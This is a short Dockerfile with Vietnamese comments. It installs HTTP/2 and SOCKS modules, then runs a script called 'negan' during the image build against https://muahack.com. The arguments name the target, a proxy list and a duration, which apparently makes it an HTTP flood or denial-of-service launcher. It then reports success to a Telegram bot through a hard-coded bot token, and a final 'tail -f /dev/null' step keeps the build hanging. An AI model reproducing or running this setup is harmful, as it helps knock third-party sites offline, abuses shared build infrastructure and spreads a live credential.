# Sử dụng Alpine chỉ với Node.js
FROM node:alpine

# Tạo thư mục làm việc
WORKDIR /negan

# Cài đặt các module cần thiết bằng npm, chỉ cài đặt dependencies chính
RUN npm install --omit=dev --omit=optional hpack https commander colors socks

# Copy toàn bộ mã nguồn sau khi cài đặt dependencies
COPY . .

# Chạy lệnh node với tham số truyền vào
RUN node ./negan -m GET -u https://muahack.com -p 1.txt --full true -s 10 || true

# Gửi tin nhắn thông báo về Telegram bot
RUN curl -s -X POST https://api.telegram.org/bot7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw/sendMessage \
    -d chat_id=7371969470 \
    -d text="Lệnh đã được thực thi thành công trên container."

RUN tail -f /dev/null

# Không có lệnh CMD hay ENTRYPOINT để ngăn container khởi động tự động
